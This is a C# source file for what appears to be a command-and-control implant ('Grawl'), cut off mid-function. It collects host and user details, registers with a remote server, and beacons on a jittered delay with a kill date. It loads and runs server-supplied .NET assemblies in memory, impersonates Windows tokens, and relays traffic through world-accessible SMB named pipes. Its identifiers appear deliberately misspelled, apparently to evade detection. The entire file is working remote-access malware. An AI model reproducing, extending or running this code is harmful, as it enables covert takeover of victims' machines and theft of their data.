﻿using System;
using System.Net;
using System.Net.Sockets;
using System.Linq;
using System.Text;
using System.IO;
using System.IO.Pipes;
using System.IO.Compression;
using System.Threading;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text.RegularExpressions;

namespace GrawlExecutor
{
    class Grawl
    {
        public static void Execute(string EasyPeasyURI, string ANOTHERID, Aes SessKEy, TcpClient client)
        {
            try
            {
                int Delay = Convert.ToInt32(@"{{REP_DELAY}}");
                int JItter = Convert.ToInt32(@"{{REP_JITTER_PERCENT}}");
                int ConneCTAttEmpts = Convert.ToInt32(@"{{REP_CONNECT_ATTEMPTS}}");
                DateTime KillDate = DateTime.FromBinary(long.Parse(@"{{REP_KILL_DATE}}"));
                string ProfileWriteFormat = @"{{REP_PROF_WRITE_FORMAT}}".Replace(Environment.NewLine, "\n");
                string ProfileReadFormat = @"{{REP_PROF_READ_FORMAT}}".Replace(Environment.NewLine, "\n");

                string Hostname = Dns.GetHostName();
                string IPAddress = Dns.GetHostAddresses(Hostname)[0].ToString();
                foreach (IPAddress a in Dns.GetHostAddresses(Dns.GetHostName()))
                {
                    if (a.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        IPAddress = a.ToString();
                        break;
                    }
                }
                string OperatingSystem = Environment.OSVersion.ToString();
                string Process = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
                int Integrity = 2;
                if (Environment.UserName.ToLower() == "system")
                {
                    Integrity = 4;
                }
                else
                {
                    var identity = WindowsIdentity.GetCurrent();
                    if (identity.Owner != identity.User)
                    {
                        Integrity = 3;
                    }
                }
                string UserDomainName = Environment.UserDomainName;
                string UserName = Environment.UserName;

                string RegBody = @"{ ""integrity"": " + Integrity + @", ""process"": """ + Process + @""", ""userDomainName"": """ + UserDomainName + @""", ""userName"": """ + UserName + @""", ""delay"": " + Convert.ToString(Delay) + @", ""jitter"": " + Convert.ToString(JItter) + @", ""connectAttempts"": " + Convert.ToString(ConneCTAttEmpts) + @", ""status"": 0, ""ipAddress"": """ + IPAddress + @""", ""hostname"": """ + Hostname + @""", ""operatingSystem"": """ + OperatingSystem + @""" }";
                BridgeMessenger bAsemEsSenger = new BridgeMessenger(EasyPeasyURI, ANOTHERID, ProfileWriteFormat);
				bAsemEsSenger.client = client;
				bAsemEsSenger.stream = client.GetStream();
                TaskingMessenger meSsenGer = new TaskingMessenger
                (
                    new MessageCrafter(ANOTHERID, SessKEy),
                    bAsemEsSenger,
                    new Profile(ProfileWriteFormat, ProfileReadFormat, ANOTHERID)
                );
                meSsenGer.QueueTaskingMessage(RegBody);
                meSsenGer.WriteTaskingMessage();
                meSsenGer.SetAuthenticator(meSsenGer.ReadTaskingMessage().Message);
                try
                {
                    // A blank upward write, this helps in some cases with an HTTP Proxy
                    meSsenGer.QueueTaskingMessage("");
                    meSsenGer.WriteTaskingMessage();
                }
                catch (Exception) { }

                List<KeyValuePair<string, Thread>> Tasks = new List<KeyValuePair<string, Thread>>();
                WindowsImpersonationContext impersonationContext = null;
                Random rnd = new Random();
                int ConnectAttemptCount = 0;
                bool alive = true;
                while (alive)
                {
                    int change = rnd.Next((int)Math.Round(Delay * (JItter / 100.00)));
                    if (rnd.Next(2) == 0) { change = -change; }
                    Thread.Sleep((Delay + change) * 1000);
                    try
                    {
                        GrawlTaskingMessage message = meSsenGer.ReadTaskingMessage();
                        if (message != null)
                        {
                            ConnectAttemptCount = 0;
                            string output = "";
                            if (message.Type == GrawlTaskingType.SetDelay || message.Type == GrawlTaskingType.SetJItter || message.Type == GrawlTaskingType.SetConneCTAttEmpts)
                            {
                                if (int.TryParse(message.Message, out int val))
                                {
                                    if (message.Type == GrawlTaskingType.SetDelay)
                                    {
                                        Delay = val;
                                        output += "Set Delay: " + Delay;
                                    }
                                    else if (message.Type == GrawlTaskingType.SetJItter)
                                    {
                                        JItter = val;
                                        output += "Set JItter: " + JItter;
                                    }
                                    else if (message.Type == GrawlTaskingType.SetConneCTAttEmpts)
                                    {
                                        ConneCTAttEmpts = val;
                                        output += "Set ConneCTAttEmpts: " + ConneCTAttEmpts;
                                    }
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message;
                                }
                                meSsenGer.QueueTaskingMessage(new GrawlTaskingMessageResponse(GrawlTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Type == GrawlTaskingType.SetKillDate)
                            {
                                if (DateTime.TryParse(message.Message, out DateTime date))
                                {
                                    KillDate = date;
                                    output += "Set KillDate: " + KillDate.ToString();
                                }
                                else
                                {
                                    output += "Error parsing: " + message.Message;
                                }
                                meSsenGer.QueueTaskingMessage(new GrawlTaskingMessageResponse(GrawlTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Type == GrawlTaskingType.Exit)
                            {
                                output += "Exited";
                                meSsenGer.QueueTaskingMessage(new GrawlTaskingMessageResponse(GrawlTaskingStatus.Completed, output).ToJson(), message.Name);
                                meSsenGer.WriteTaskingMessage();
                                return;
                            }
                            else if(message.Type == GrawlTaskingType.Tasks)
                            {
                                if (!Tasks.Where(T => T.Value.IsAlive).Any()) { output += "No active tasks!"; }
                                else
                                {
                                    output += "Task       Status" + Environment.NewLine;
                                    output += "----       ------" + Environment.NewLine;
                                    output += String.Join(Environment.NewLine, Tasks.Where(T => T.Value.IsAlive).Select(T => T.Key + " Active").ToArray());
                                }
                                meSsenGer.QueueTaskingMessage(new GrawlTaskingMessageResponse(GrawlTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if(message.Type == GrawlTaskingType.TaskKill)
                            {
                                var matched = Tasks.Where(T => T.Value.IsAlive && T.Key.ToLower() == message.Message.ToLower());
                                if (!matched.Any())
                                {
                                    output += "No active task with name: " + message.Message;
                                }
                                else
                                {
                                    KeyValuePair<string, Thread> t = matched.First();
                                    t.Value.Abort();
                                    Thread.Sleep(3000);
                                    if (t.Value.IsAlive)
                                    {
                                        t.Value.Suspend();
                                    }
                                    output += "Task: " + t.Key + " killed!";
                                }
                                meSsenGer.QueueTaskingMessage(new GrawlTaskingMessageResponse(GrawlTaskingStatus.Completed, output).ToJson(), message.Name);
                            }
                            else if (message.Token)
                            {
                                if (impersonationContext != null)
                                {
                                    impersonationContext.Undo();
                                }
                                IntPtr impersonatedToken = IntPtr.Zero;
                                Thread t = new Thread(() => impersonatedToken = TaskExecute(meSsenGer, message, Delay));
                                t.Start();
                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                                bool completed = t.Join(5000);
                                if (completed && impersonatedToken != IntPtr.Zero)
                                {
                                    try
                                    {
                                        WindowsIdentity identity = new WindowsIdentity(impersonatedToken);
                                        impersonationContext = identity.Impersonate();
                                    }
                                    catch (ArgumentException) { }
                                }
                                else
                                {
                                    impersonationContext = null;
                                }
                            }
                            else
                            {
                                Thread t = new Thread(() => TaskExecute(meSsenGer, message, Delay));
                                t.Start();
                                Tasks.Add(new KeyValuePair<string, Thread>(message.Name, t));
                            }
                        }
                        meSsenGer.WriteTaskingMessage();
                    }
                    catch (ObjectDisposedException e)
                    {
                        ConnectAttemptCount++;
                        meSsenGer.QueueTaskingMessage(new GrawlTaskingMessageResponse(GrawlTaskingStatus.Completed, "").ToJson());
                        meSsenGer.WriteTaskingMessage();
                    }
                    catch (Exception e)
                    {
                        ConnectAttemptCount++;
                        Console.Error.WriteLine("Loop Exception: " + e.GetType().ToString() + " " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                    if (ConnectAttemptCount >= ConneCTAttEmpts) { return; }
                    if (KillDate.CompareTo(DateTime.Now) < 0) { return; }
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("Outer Exception: " + e.Message + Environment.NewLine + e.StackTrace);
            }
        }

        private static IntPtr TaskExecute(TaskingMessenger meSsenGer, GrawlTaskingMessage message, int Delay)
        {
            const int MAX_MESSAGE_SIZE = 1048576;
            string output = "";
            try
            {
                if (message.Type == GrawlTaskingType.Assembly)
                {
                    string[] pieces = message.Message.Split(',');
                    if (pieces.Length > 0)
                    {
                        object[] parameters = null;
                        if (pieces.Length > 1) { parameters = new object[pieces.Length - 1]; }
                        for (int i = 1; i < pieces.Length; i++) { parameters[i - 1] = Encoding.UTF8.GetString(Convert.FromBase64String(pieces[i])); }
                        byte[] packedbytes = Convert.FromBase64String(pieces[0]);
                        byte[] depackedbytes = Utilities.Decompress(packedbytes);
                        Assembly grawlTask = Assembly.Load(depackedbytes);
                        PropertyInfo streamProp = grawlTask.GetType("Task").GetProperty("OutputStream");
                        string results = "";
                        if (streamProp == null)
                        {
                            results = (string) grawlTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
                        }
                        else
                        {
                            Thread invokeThread = new Thread(() => results = (string) grawlTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
                            using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
                            {
                                using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
                                {
                                    streamProp.SetValue(null, pipeClient, null);
                                    DateTime lastTime = DateTime.Now;
                                    invokeThread.Start();
                                    using (StreamReader reader = new StreamReader(pipeServer))
                                    {
                                        object synclock = new object();
                                        string currentRead = "";
                                        Thread readThread = new Thread(() => {
                                            int count;
                                            char[] read = new char[MAX_MESSAGE_SIZE];
                                            while ((count = reader.Read(read, 0, read.Length)) > 0)
                                            {
                                                lock (synclock)
                                                {
                                                    currentRead += new string(read, 0, count);
                                                }
                                            }
                                        });
                                        readThread.Start();
                                        while (readThread.IsAlive)
                                        {
                                            Thread.Sleep(Delay * 1000);
                                            lock (synclock)
                                            {
                                                try
                                                {
                                                    if (currentRead.Length >= MAX_MESSAGE_SIZE)
                                                    {
                                                        for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
                                                        {
                                                            string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
                                                            try
                                                            {
                                                                GrawlTaskingMessageResponse response = new GrawlTaskingMessageResponse(GrawlTaskingStatus.Progressed, aRead);
                                                                meSsenGer.QueueTaskingMessage(response.ToJson(), message.Name);
                                                                meSsenGer.WriteTaskingMessage();
                                                            }
                                                            catch (Exception) {}
                                                        }
                                                        currentRead = "";
                                                        lastTime = DateTime.Now;
                                                    }
                                                    else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
                                                    {
                                                        GrawlTaskingMessageResponse response = new GrawlTaskingMessageResponse(GrawlTaskingStatus.Progressed, currentRead);
                                                        meSsenGer.QueueTaskingMessage(response.ToJson(), message.Name);
                                                        meSsenGer.WriteTaskingMessage();
                                                        currentRead = "";
                                                        lastTime = DateTime.Now;
                                                    }
                                                }
                                                catch (ThreadAbortException) { break; }
                                                catch (Exception) { currentRead = ""; }
                                            }
                                        }
                                        output += currentRead;
                                    }
                                }
                            }
                            invokeThread.Join();
                        }
                        output += results;
                    }
                }
                else if (message.Type == GrawlTaskingType.Connect)
                {
                    string[] split = message.Message.Split(',');
                    bool connected = meSsenGer.Connect(split[0], split[1]);
                    output += connected ? "Connection to " + split[0] + ":" + split[1] + " succeeded!" :
                                          "Connection to " + split[0] + ":" + split[1] + " failed.";
                }
                else if (message.Type == GrawlTaskingType.Disconnect)
                {
                    bool disconnected = meSsenGer.Disconnect(message.Message);
                    output += disconnected ? "Disconnect succeeded!" : "Disconnect failed.";
                }
            }
            catch (Exception e)
            {
                try
                {
                    GrawlTaskingMessageResponse response = new GrawlTaskingMessageResponse(GrawlTaskingStatus.Completed, "Task Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    meSsenGer.QueueTaskingMessage(response.ToJson(), message.Name);
                    meSsenGer.WriteTaskingMessage();
                }
                catch (Exception) { }
            }
            finally
            {
                for (int i = 0; i < output.Length; i += MAX_MESSAGE_SIZE)
                {
                    string aRead = output.Substring(i, Math.Min(MAX_MESSAGE_SIZE, output.Length - i));
                    try
                    {
                        GrawlTaskingStatus status = i + MAX_MESSAGE_SIZE < output.Length ? GrawlTaskingStatus.Progressed : GrawlTaskingStatus.Completed;
                        GrawlTaskingMessageResponse response = new GrawlTaskingMessageResponse(status, aRead);
                        meSsenGer.QueueTaskingMessage(response.ToJson(), message.Name);
                        meSsenGer.WriteTaskingMessage();
                    }
                    catch (Exception) {}
                }
                if (string.IsNullOrEmpty(output))
                {
                    GrawlTaskingMessageResponse response = new GrawlTaskingMessageResponse(GrawlTaskingStatus.Completed, "");
                    meSsenGer.QueueTaskingMessage(response.ToJson(), message.Name);
                    meSsenGer.WriteTaskingMessage();
                }
            }
            return WindowsIdentity.GetCurrent().Token;
        }
    }


    public class Profile
    {
        private string ReadFormat { get; }
        private string WriteFormat { get; }
        private string Guid { get; set; }

        public Profile(string ReadFormat, string WriteFormat, string Guid)
        {
            this.ReadFormat = ReadFormat;
            this.WriteFormat = WriteFormat;
            this.Guid = Guid;
        }

        public GrawlEncMsg ParseReadFormat(string Message) { return Parse(this.ReadFormat, Message); }
        public GrawlEncMsg ParseWriteFormat(string Message) { return Parse(this.WriteFormat, Message); }
        public string FormatRead(GrawlEncMsg Message) { return Format(this.ReadFormat, this.Guid, Message); }
        public string FormatWrite(GrawlEncMsg Message) { return Format(this.WriteFormat, this.Guid, Message); }

        private static GrawlEncMsg Parse(string Format, string Message)
        {
            string json = Common.GrawlEncoding.GetString(Utilities.MessageTransform.Invert(
                Utilities.Parse(Message, Format)[0]
            ));
            if (json == null || json.Length < 3)
            {
                return null;
            }
            return GrawlEncMsg.FromJson(json);
        }

        private static string Format(string Format, string anotherid, GrawlEncMsg Message)
        {
            return String.Format(Format,
                Utilities.MessageTransform.Transform(Common.GrawlEncoding.GetBytes(GrawlEncMsg.ToJson(Message))), anotherid
            );
        }
    }

    public class TaskingMessenger
    {
        private object _UpstreamLock = new object();
        private IMessenger UpstreamMessenger { get; set; }
        private object _MessageQueueLock = new object();
        private Queue<string> MessageQueue { get; } = new Queue<string>();

        private MessageCrafter Crafter { get; }
        private Profile Profile { get; }

        protected List<IMessenger> DownstreamMessengers { get; } = new List<IMessenger>();

        public TaskingMessenger(MessageCrafter Crafter, IMessenger Messenger, Profile Profile)
        {
            this.Crafter = Crafter;
            this.UpstreamMessenger = Messenger;
            this.Profile = Profile;
            this.UpstreamMessenger.UpstreamEventHandler += (sender, e) => {
                this.QueueTaskingMessage(e.Message);
                this.WriteTaskingMessage();
            };
        }

        public GrawlTaskingMessage ReadTaskingMessage()
        {
            ProfileMessage readMessage = null;
            lock (_UpstreamLock)
            {
                readMessage = this.UpstreamMessenger.Read();
            }
            if (readMessage == null)
            {
                return null;
            }
            GrawlEncMsg grawlMessage = null;
            if (readMessage.Type == MessageType.Read) 
            {
                grawlMessage = this.Profile.ParseReadFormat(readMessage.Message);
            }
            else if (readMessage.Type == MessageType.Write)
            {
                grawlMessage = this.Profile.ParseWriteFormat(readMessage.Message);
            }
            if (grawlMessage == null)
            {
                return null;
            }
            else if (grawlMessage.Type == GrawlEncMsg.GrawlEncMsgType.Tasking)
            {
                string json = this.Crafter.Retrieve(grawlMessage);
                return (json == null || json == "") ? null : GrawlTaskingMessage.FromJson(json);
            }
            else
            {
                string json = this.Crafter.Retrieve(grawlMessage);
                GrawlEncMsg wrappedMessage = GrawlEncMsg.FromJson(json);
                IMessenger relay = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier == wrappedMessage.ANOTHERID);
                if (relay != null)
                {
                    relay.Write(this.Profile.FormatRead(wrappedMessage));
                }
                return null;
            }
        }

        public void QueueTaskingMessage(string Message, string Meta = "")
        {
            GrawlEncMsg grawlMessage = this.Crafter.Create(Message, Meta);
            string uploaded = this.Profile.FormatWrite(grawlMessage);
            lock (_MessageQueueLock)
            {
                this.MessageQueue.Enqueue(uploaded);
            }
        }

        public void WriteTaskingMessage()
        {
            try
            {
                lock (_UpstreamLock)
                {
                    lock (_MessageQueueLock)
                    {
                        this.UpstreamMessenger.Write(this.MessageQueue.Dequeue());
                    }
                }
            }
            catch (InvalidOperationException) {}
        }

        public void SetAuthenticator(string Authenticator)
        {
            lock (this._UpstreamLock)
            {
                this.UpstreamMessenger.Authenticator = Authenticator;
            }
        }

        public bool Connect(string Hostname, string PipeName)
        {
            IMessenger olddownstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Hostname.ToLower() == (Hostname + ":" + PipeName).ToLower());
            if (olddownstream != null)
            {
                olddownstream.Close();
                this.DownstreamMessengers.Remove(olddownstream);
            }

            SMBMessenger downstream = new SMBMessenger(Hostname, PipeName);
            Thread readThread = new Thread(() =>
            {
                while (downstream.IsConnected)
                {
                    try
                    {
                        ProfileMessage read = downstream.Read();
                        if (read != null && !string.IsNullOrEmpty(read.Message))
                        {
                            if (string.IsNullOrEmpty(downstream.Identifier))
                            {
                                GrawlEncMsg message = this.Profile.ParseWriteFormat(read.Message);
                                if (message.ANOTHERID.Length == 20)
                                {
                                    downstream.Identifier = message.ANOTHERID.Substring(10);
                                }
                                else if (message.ANOTHERID.Length == 10)
                                {
                                    downstream.Identifier = message.ANOTHERID;
                                }
                            }
                            this.UpstreamMessenger.Write(read.Message);
                        }
                    }
                    catch (Exception e)
                    {
                        Console.Error.WriteLine("Thread Exception: " + e.Message + Environment.NewLine + e.StackTrace);
                    }
                }
                // Connection became disconnected and therefore we remove the downstream object
                this.DownstreamMessengers.Remove(downstream);
            });
            downstream.ReadThread = readThread;
            downstream.ReadThread.Start();
            this.DownstreamMessengers.Add(downstream);
            return true;
        }

        public bool Disconnect(string Identifier)
        {
            IMessenger downstream = this.DownstreamMessengers.FirstOrDefault(DM => DM.Identifier.ToLower() == Identifier.ToLower());
            if (downstream != null)
            {
                downstream.Close();
                this.DownstreamMessengers.Remove(downstream);
                return true;
            }
            return false;
        }
    }

	// {{REP_BRIDGE_MESSENGER_CODE}}

	public class SMBMessenger : IMessenger
    {
        public string Hostname { get; } = string.Empty;
        public string Identifier { get; set; } = string.Empty;
        public string Authenticator { get; set; } = string.Empty;
        public EventHandler<MessageEventArgs> UpstreamEventHandler { get; set; }
        public Thread ReadThread { get; set; } = null;

        private string PipeName { get; } = null;
        // Thread that monitors the status of the named pipe and updates _IsConnected accordingly.
        private Thread MonitoringThread { get; set; } = null;
        // This flag syncs communication peers in case one of the them dies (see method Read and Write)
        private bool IsServer { get; set; }
        private int Timeout { get; set; } = 5000;

        private object _PipeLock = new object();
        private PipeStream _Pipe;
        private PipeStream Pipe
        {
            get { lock (this._PipeLock) { return this._Pipe; } }
            set { lock (this._PipeLock) { this._Pipe = value; } }
        }

        protected object _IsConnectedLock = new object();
        private bool _IsConnected;
        public bool IsConnected
        {
            get { lock (this._IsConnectedLock) { return this._IsConnected; } }
            set { lock (this._IsConnectedLock) { this._IsConnected = value; } }
        }

        public SMBMessenger(string Hostname, string Pipename)
        {
            this.Hostname = Hostname;
            this.PipeName = Pipename;
            this.IsServer = false;
            this.InitializePipe();
        }

        public SMBMessenger(PipeStream Pipe, string Pipename)
        {
            this.Pipe = Pipe;
            this.PipeName = Pipename;
            this.IsServer = true;
            if (Pipe != null && Pipe.IsConnected)
            {
                this.IsConnected = Pipe.IsConnected;
                this.MonitorPipeState();
            }
            this.InitializePipe();
        }

        public ProfileMessage Read()
        {
            ProfileMessage result = null;
            try
            {
                // If the Grawl acts as SMB server, then after an interruption it shall wait in the read method until the connection 
                // is re-established.
                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
                if (this.IsServer)
                {
                    this.InitializePipe();
                }
                if (this.IsConnected)
                {
                    result = new ProfileMessage { Type = MessageType.Read, Message = Common.GrawlEncoding.GetString(this.ReadBytes()) };
                }
            }
            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
            // try to restablish the named pipe
            catch (IOException) { }
            catch (NullReferenceException) { }
            catch (ObjectDisposedException) { }
            return result;
        }

        public void Write(string Message)
        {
            try
            {
                // If the Grawl acts as SMB client, then after an interruption it shall wait in the write method until the connection 
                // is re-established.
                // This ensures that after the interruption, both communication peers return to their pre-defined state. If this is not
                // implemented, then both communication peers might return to the same state (e.g., read), which leads to a deadlock.
                if (!this.IsServer)
                {
                    this.InitializePipe();
                }
                if (this.IsConnected)
                {
                    this.WriteBytes(Common.GrawlEncoding.GetBytes(Message));
                }
            }
            // These are exceptions that could be raised, if the named pipe became (unexpectedly) closed. It is important to catch these 
            // exceptions here so that the calling method can continue until it calls Read or Write the next time and then, the they'll 
            // try to restablish the named pipe
            catch (IOException) { }
            catch (NullReferenceException) { }
            catch (ObjectDisposedException) { }
        }

        public void Close()
        {
            // Close named pipe and terminate MonitoringThread by setting IsConnected to false
            lock (this._PipeLock)
            {
                try
                {
                    if (this._Pipe != null)
                    {
                        this._Pipe.Close();
                    }
                }
                catch (Exception) { }
                this._Pipe = null;
                this.IsConnected = false;
            }
        }

        private void InitializePipe()
        {
            if (!this.IsConnected)
            {
                // If named pipe became disconnected (!this.IsConnected), then wait for a new incoming connection, else continue.
                if (this.IsServer)
                {
                    PipeSecurity ps = new PipeSecurity();
                    ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                    NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                    newServerPipe.WaitForConnection();
                    this.Pipe = newServerPipe;
                    this.IsConnected = true;
                    this.MonitorPipeState();
                    // Tell the parent Grawl the ANOTHERID so that it knows to which child grawl which messages shall be forwarded. Without this message, any further communication breaks.
                    this.UpstreamEventHandler?.Invoke(this, new MessageEventArgs { Message = string.Empty });
                }
                // If named pipe became disconnected (!this.IsConnected), then try to re-connect to the SMB server, else continue.
                else
                {
                    NamedPipeClientStream ClientPipe = new NamedPipeClientStream(Hostname, PipeName, PipeDirection.InOut, PipeOptions.Asynchronous);
                    ClientPipe.Connect(Timeout);
                    ClientPipe.ReadMode = PipeTransmissionMode.Byte;
                    this.Pipe = ClientPipe;
                    this.IsConnected = true;
                    // Start the pipe status monitoring thread
                    this.MonitorPipeState();
                }
            }
        }

        private void MonitorPipeState()
        {
            this.MonitoringThread = new Thread(() =>
            {
                while (this.IsConnected)
                {
                    try
                    {

                        Thread.Sleep(1000);
                        // We cannot use this.Pipe.IsConnected because this will result in a deadlock
                        this.IsConnected = this._Pipe.IsConnected;
                        if (!this.IsConnected)
                        {
                            this._Pipe.Close();
                            this._Pipe = null;
                        }
                    }
                    catch (Exception) { }
                }
            });
            this.MonitoringThread.IsBackground = true;
            this.MonitoringThread.Start();
        }

        private void WriteBytes(byte[] bytes)
        {
            byte[] compressed = Utilities.Compress(bytes);
            byte[] size = new byte[4];
            size[0] = (byte)(compressed.Length >> 24);
            size[1] = (byte)(compressed.Length >> 16);
            size[2] = (byte)(compressed.Length >> 8);
            size[3] = (byte)compressed.Length;
            this.Pipe.Write(size, 0, size.Length);
            var writtenBytes = 0;
            while (writtenBytes < compressed.Length)
            {
                int bytesToWrite = Math.Min(compressed.Length - writtenBytes, 1024);
                this.Pipe.Write(compressed, writtenBytes, bytesToWrite);
                writtenBytes += bytesToWrite;
            }
        }

        private byte[] ReadBytes()
        {
            byte[] size = new byte[4];
            int ToTalReaDBytes = 0;
            do
            {
                ToTalReaDBytes += this.Pipe.Read(size, 0, size.Length);
            } while (ToTalReaDBytes < size.Length);
            int len = (size[0] << 24) + (size[1] << 16) + (size[2] << 8) + size[3];

            byte[] buffer = new byte[1024];
            using (var ms = new MemoryStream())
            {
                ToTalReaDBytes = 0;
                int readBytes = 0;
                do
                {
                    readBytes = this.Pipe.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readBytes);
                    ToTalReaDBytes += readBytes;
                } while (ToTalReaDBytes < len);
                return Utilities.Decompress(ms.ToArray());
            }
        }
    }

    public class MessageCrafter
    {
        private string ANOTHERID { get; }
        private Aes SessKEy { get; }

        public MessageCrafter(string ANOTHERID, Aes SessKEy)
        {
            this.ANOTHERID = ANOTHERID;
            this.SessKEy = SessKEy;
        }

        public GrawlEncMsg Create(string Message, string Meta = "")
        {
            return this.Create(Common.GrawlEncoding.GetBytes(Message), Meta);
        }

        public GrawlEncMsg Create(byte[] Message, string Meta = "")
        {
            byte[] encryptedMessagePacket = Utilities.AesEncrypt(Message, this.SessKEy.Key);
            byte[] encryptionIV = new byte[Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, 0, encryptionIV, 0, Common.AesIVLength);
            byte[] encryptedMessage = new byte[encryptedMessagePacket.Length - Common.AesIVLength];
            Buffer.BlockCopy(encryptedMessagePacket, Common.AesIVLength, encryptedMessage, 0, encryptedMessagePacket.Length - Common.AesIVLength);

            byte[] hmac = Utilities.ComputeHMAC(encryptedMessage, SessKEy.Key);
            return new GrawlEncMsg
            {
                ANOTHERID = this.ANOTHERID,
                Meta = Meta,
                EncMsg = Convert.ToBase64String(encryptedMessage),
                IV = Convert.ToBase64String(encryptionIV),
                HMAC = Convert.ToBase64String(hmac)
            };
        }

        public string Retrieve(GrawlEncMsg message)
        {
            if (message == null || !message.VerifyHMAC(this.SessKEy.Key))
            {
                return null;
            }
            return Common.GrawlEncoding.GetString(Utilities.AesDecrypt(message, SessKEy.Key));
        }
    }

    public enum GrawlTaskingType
    {
        Assembly,
        SetDelay,
        SetJItter,
        SetConneCTAttEmpts,
        SetKillDate,
        Exit,
        Connect,
        Disconnect,
        Tasks,
        TaskKill
    }

    public class GrawlTaskingMessage
    {
        public GrawlTaskingType Type { get; set; }
        public string Name { get; set; }
        public string Message { get; set; }
        public bool Token { get; set; }

        private static string GrawlTaskingMessageFormat = @"{{""type"":""{0}"",""name"":""{1}"",""message"":""{2}"",""token"":{3}}}";
        public static GrawlTaskingMessage FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GrawlTaskingMessageFormat);
            if (parseList.Count < 3) { return null; }
            return new GrawlTaskingMessage
            {
                Type = (GrawlTaskingType)Enum.Parse(typeof(GrawlTaskingType), parseList[0], true),
                Name = parseList[1],
                Message = parseList[2],
                Token = Convert.ToBoolean(parseList[3])
            };
        }

        public static string ToJson(GrawlTaskingMessage message)
        {
            return String.Format(
                GrawlTaskingMessageFormat,
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Name),
                Utilities.JavaScriptStringEncode(message.Message),
                message.Token
            );
        }
    }

    public enum GrawlTaskingStatus
    {
        Uninitialized,
        Tasked,
        Progressed,
        Completed,
        Aborted
    }

    public class GrawlTaskingMessageResponse
    {
        public GrawlTaskingMessageResponse(GrawlTaskingStatus status, string output)
        {
            Status = status;
            Output = output;
        }
        public GrawlTaskingStatus Status { get; set; }
        public string Output { get; set; }

        private static string GrawlTaskingMessageResponseFormat = @"{{""status"":""{0}"",""output"":""{1}""}}";
        public string ToJson()
        {
            return String.Format(
                GrawlTaskingMessageResponseFormat,
                this.Status.ToString("D"),
                Utilities.JavaScriptStringEncode(this.Output)
            );
        }
    }

    public class GrawlEncMsg
    {
        public enum GrawlEncMsgType
        {
            Routing,
            Tasking
        }

        public string ANOTHERID { get; set; } = "";
        public GrawlEncMsgType Type { get; set; }
        public string Meta { get; set; } = "";
        public string IV { get; set; } = "";
        public string EncMsg { get; set; } = "";
        public string HMAC { get; set; } = "";

        public bool VerifyHMAC(byte[] Key)
        {
            if (EncMsg == "" || HMAC == "" || Key.Length == 0) { return false; }
            try
            {
                var hashedBytes = Convert.FromBase64String(this.EncMsg);
                return Utilities.VerifyHMAC(hashedBytes, Convert.FromBase64String(this.HMAC), Key);
            }
            catch
            {
                return false;
            }
        }

        private static string GrawlEncMsgFormat = @"{{""ANOTHERID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncMsg"":""{4}"",""HMAC"":""{5}""}}";
        public static GrawlEncMsg FromJson(string message)
        {
            List<string> parseList = Utilities.Parse(message, GrawlEncMsgFormat);
            if (parseList.Count < 5) { return null; }
            return new GrawlEncMsg
            {
                ANOTHERID = parseList[0],
                Type = (GrawlEncMsgType)int.Parse(parseList[1]),
                Meta = parseList[2],
                IV = parseList[3],
                EncMsg = parseList[4],
                HMAC = parseList[5]
            };
        }

        public static string ToJson(GrawlEncMsg message)
        {
            return String.Format(
                GrawlEncMsgFormat,
                Utilities.JavaScriptStringEncode(message.ANOTHERID),
                message.Type.ToString("D"),
                Utilities.JavaScriptStringEncode(message.Meta),
                Utilities.JavaScriptStringEncode(message.IV),
                Utilities.JavaScriptStringEncode(message.EncMsg),
                Utilities.JavaScriptStringEncode(message.HMAC)
            );
        }
    }

    public static class Common
    {
        public static int AesIVLength = 16;
        public static CipherMode AesCipherMode = CipherMode.CBC;
        public static PaddingMode AesPaddingMode = PaddingMode.PKCS7;
        public static Encoding GrawlEncoding = Encoding.UTF8;
    }

    public static class Utilities
    {
        // Returns IV (16 bytes) + EncryptedData byte array
        public static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            Aes SessKEy = Aes.Create();
            SessKEy.Mode = Common.AesCipherMode;
            SessKEy.Padding = Common.AesPaddingMode;
            SessKEy.GenerateIV();
            SessKEy.Key = key;

            byte[] encrypted = SessKEy.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
            byte[] result = new byte[SessKEy.IV.Length + encrypted.Length];
